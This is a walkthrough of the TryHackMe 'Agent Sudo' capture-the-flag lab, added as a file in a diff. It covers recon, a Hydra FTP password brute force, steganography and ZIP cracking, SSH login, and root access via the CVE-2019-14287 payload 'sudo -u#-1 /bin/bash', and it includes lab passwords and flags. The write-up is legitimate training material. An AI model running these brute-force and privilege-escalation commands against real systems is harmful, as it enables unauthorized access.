@@ -1,0 +1,284 @@
+TryHackMe — Agent Sudo
+
+Platform: TryHackMe
+Difficulty: Easy
+Category: Linux / FTP / Web / Steganography / Privilege Escalation
+Target: 10.48.187.59
+
+1. Initial Reconnaissance
+
+I started with an Nmap scan to identify the services running on the target.
+nmap -sC -sV -Pn -T4 10.48.187.59
+The scan revealed three open ports:
+21/tcp  open  ftp     vsftpd 3.0.3
+22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp  open  http    Apache 2.4.29
+Since FTP was available, I decided to investigate it first.
+
+2. FTP Enumeration
+
+I tried to connect to the FTP server using anonymous login:
+ftp 10.48.187.59
+I entered:
+Username: anonymous
+The server asked for a password, but the login failed with:
+530 Login incorrect
+So anonymous FTP access was not available.
+I then moved on to the web server.
+
+3. Web Enumeration
+
+I first tried directory enumeration with Gobuster:
+gobuster dir -u http://10.48.187.59 -w /usr/share/wordlists/dirb/common.txt
+The scan did not reveal anything particularly useful.
+I then opened the target IP address in Firefox:
+http://10.48.187.59
+The webpage displayed a message about agents and gave a clue that the secret agent's name starts with the letter C.
+The page also indicated that the agent's codename needed to be used as the HTTP User-Agent.
+I searched for a way to change the User-Agent in Firefox and found the User-Agent Switcher/Manager extension.
+I installed the extension, changed the User-Agent to:
+C
+and refreshed the page.
+The website then revealed the agent's name:
+Chris
+This gave me a possible FTP username:
+chris
+
+
+4. FTP Password Discovery
+
+Since I now had the username `chris`, I used Hydra to test passwords against the FTP service.
+hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.48.187.59 ftp
+Hydra successfully found the password:
+Username: chris
+Password: crystal
+I then tried logging into FTP again:
+ftp 10.48.187.59
+This time the login was successful.
+I listed the available files:
+ls
+The FTP server contained:
+To_agentJ.txt
+cute-alien.jpg
+cutie.png
+I downloaded all the files using:
+mget *
+
+
+5. Investigating the Downloaded Files
+
+There were three files:
+cute-alien.jpg
+cutie.png
+To_agentJ.txt
+I first read the text file:
+cat To_agentJ.txt
+It contained:
+Dear agent J,
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+From,
+Agent C
+This indicated that the images contained additional information and that the login password was hidden inside one of them.
+
+6. Image Enumeration
+
+I checked the metadata of both images using ExifTool:
+exiftool cute-alien.jpg
+and:
+exiftool cutie.png
+The JPEG metadata did not reveal the password.
+The PNG, however, contained a suspicious warning:
+Warning: [minor] Trailer data after PNG IEND chunk
+This suggested that there was additional data appended to the PNG file.
+I then used Binwalk against both images:
+binwalk cute-alien.jpg
+and:
+binwalk cutie.png
+The JPEG did not contain anything interesting, but the PNG contained an embedded ZIP archive.
+The Binwalk output showed:
+Zip archive data, encrypted
+name: To_agentR.txt
+I extracted the embedded files using:
+binwalk -e cutie.png
+This created an extracted directory containing the embedded ZIP and other data.
+
+7. Investigating the Embedded ZIP
+
+Inside the extracted directory, I found:
+8702.zip
+To_agentR.txt
+I read the extracted text file:
+cat To_agentR.txt
+It contained:
+Agent C,
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+By,
+Agent R
+The value:
+QXJlYTUx
+looked like Base64-encoded text.
+I decoded it using a Base64 decoder, which revealed:
+Area51
+I then investigated the password-protected ZIP archive.
+I generated a hash from the ZIP using:
+zip2john 8702.zip > hash.txt
+Then I used John the Ripper to crack the hash:
+john hash.txt
+After cracking the hash, I checked the recovered password:
+john --show hash.txt
+The ZIP password was recovered successfully.
+I was then able to access the contents of the archive.
+
+8. Steganography in cute-alien.jpg
+
+The earlier message said that the login password was stored inside the fake picture, so I investigated `cute-alien.jpg` using Steghide.
+steghide extract -sf cute-alien.jpg
+Steghide extracted:
+message.txt
+I read the file:
+cat message.txt
+The message revealed the SSH login password for James:
+Hi james,
+Glad you find this message. Your login password is hackerrules!
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+Your buddy,
+chris
+So I now had:
+Username: james
+Password: hackerrules!
+
+
+9. SSH Login
+
+I used the credentials to connect through SSH:
+ssh james@10.48.187.59
+The login was successful.
+I verified the current user:
+whoami
+Output:
+james
+I checked the home directory:
+ls
+The user flag was present in:
+user_flag.txt
+I retrieved it using:
+cat user_flag.txt
+User flag:
+b03d975e8c92a7c04146cfa7a5a313c7
+
+
+10. Privilege Escalation
+
+After obtaining the user shell, I checked the sudo permissions:
+sudo -l
+The result was:
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+This looked interesting because James was allowed to execute `/bin/bash` as other users, with root apparently excluded.
+I then checked the installed sudo version:
+sudo --version
+The target was running:
+Sudo version 1.8.21p2
+This version is vulnerable to CVE-2019-14287, which can allow the `(ALL, !root)` restriction to be bypassed through special UID handling.
+I used the corresponding exploit payload:
+sudo -u#-1 /bin/bash
+I then checked the current user:
+whoami
+The result was:
+root
+This confirmed that privilege escalation was successful.
+
+11. Root Flag
+
+I moved to the root directory:
+cd /root
+Then listed the files:
+ls
+The root flag was stored in:
+root.txt
+I read it using:
+cat root.txt
+Root flag:
+b53a02f55b57d4439e3341834d70c062
+The machine was successfully rooted.
+
+Tools Used
+
+* Nmap — Port and service enumeration
+* Gobuster — Web directory enumeration
+* Firefox — Web browsing and User-Agent investigation
+* User-Agent Switcher/Manager — Changing the HTTP User-Agent
+* Hydra — FTP password brute-forcing
+* FTP — File enumeration and download
+* ExifTool — Image metadata analysis
+* Binwalk — Detecting and extracting embedded data
+* Base64 decoder — Decoding the encoded value
+* zip2john — Extracting a crackable hash from the ZIP archive
+* John the Ripper — Cracking the ZIP password
+* Steghide — Extracting hidden data from the JPEG
+* SSH — Remote login
+* sudo — Privilege enumeration and privilege escalation
+
+Important Commands and Their Uses
+
+```bash
+exiftool <image>
+```
+Displays metadata contained in an image.
+
+```bash
+binwalk <file>
+```
+Searches for embedded files and compressed data.
+
+```bash
+binwalk -e <file>
+```
+Attempts to extract identified embedded files.
+
+```bash
+zip2john <zip> > hash.txt
+```
+Converts a protected ZIP archive into a hash format usable by John the Ripper.
+
+```bash
+john hash.txt
+```
+Attempts to crack the generated password hash.
+
+```bash
+steghide extract -sf <image>
+```
+Extracts hidden data embedded inside a supported image.
+
+
+```bash
+sudo --version
+```
+Displays the installed sudo version.
+
+Lessons Learned
+
+1. Start with enumeration and don't assume the first available service is the intended entry point.
+
+2. Failed anonymous FTP login does not mean FTP is useless. Finding a valid username can open the service later.
+
+3. Web pages can contain clues that are not immediately obvious. The User-Agent clue was essential for discovering the FTP username.
+
+4. User-Agent manipulation is useful when a web application specifically expects a particular client identity.
+
+5. Images should not be trusted as ordinary files during a CTF. They can contain metadata, embedded archives, or hidden messages.
+
+6. ExifTool is useful for metadata analysis, while Binwalk can reveal embedded files that are not visible normally.
+
+7. Base64 is encoding, not encryption. Recognizing encoded strings can reveal useful information quickly.
+
+8. Password-protected archives can be investigated with `zip2john` and John the Ripper.
+
+9. Steghide can be used to hide and extract data from images. In this machine, it provided the SSH password needed to move from the FTP stage to SSH.
+
+10. After obtaining a user shell, `sudo -l` should always be checked. Misconfigured sudo permissions can lead to privilege escalation.
+
+11. Version enumeration is important. The sudo version, combined with the `(ALL, !root)` configuration, revealed a path to CVE-2019-14287.
+
+12. Keeping software updated is critical. The final privilege escalation was possible because the target was running an outdated vulnerable version of sudo.
